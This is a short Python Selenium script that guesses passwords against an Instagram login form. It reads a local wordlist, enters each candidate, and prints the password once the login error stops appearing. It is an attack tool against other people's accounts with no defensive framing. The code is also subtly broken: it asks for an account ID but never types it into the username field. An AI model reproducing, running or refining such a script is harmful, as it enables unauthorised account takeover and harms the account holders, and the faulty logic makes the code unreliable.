import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
options=Options()
options.add_experimental_option("detach",True)
insta_id=input("Enter the Insta Id: ")
def is_element_present(by, value):
    try:
        driver.find_element(by, value)
        return True
    except:
        return False
driver=webdriver.Chrome(options=options)
with open('wordlist.txt',"r") as pass_file:
    line_list=pass_file.readlines()
    line_list=[line.strip() for line in line_list]
driver.get(url="https://www.instagram.com/")
time.sleep(2)
name=driver.find_element(By.NAME,"username")
name.send_keys()
time.sleep(2)
n=1
fill=driver.find_element(By.NAME,"password")
for password in line_list:
    fill.send_keys(password)
    fill.send_keys(Keys.ENTER)
    if n==1:
        time.sleep(2)
        n+=1
    time.sleep(0.5)
    if not is_element_present(By.XPATH,'//*[@id="loginForm"]/span/div'):
        print(f"Your Password is {password}")
    else:
        for i in range(len(password)):
            fill.send_keys(Keys.BACKSPACE)

